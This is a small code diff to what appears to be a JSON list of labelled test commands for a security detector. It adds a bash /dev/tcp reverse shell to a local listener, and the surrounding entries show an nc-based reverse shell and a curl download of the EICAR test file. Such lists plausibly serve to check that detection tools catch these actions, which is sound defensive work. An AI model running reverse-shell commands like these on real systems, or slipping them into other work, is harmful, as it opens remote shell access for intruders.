@@ -12,6 +12,10 @@
        "command": "curl https://secure.eicar.org/eicar.com -o /eicar.com  && chmod +x /eicar.com  && cat /eicar.com"
    },
    {
+       "label": "Reverse Shell (to local listener)",
+       "command": "bash -i >& /dev/tcp/localhost/3000 0>&1"
+   },
+   {
        "label": "Reverse Shell (using nc)",
        "command": "(nc -l -p 8888 &); sleep 1 ; bash -i >& /dev/tcp/localhost/8888 0>&1"
    },
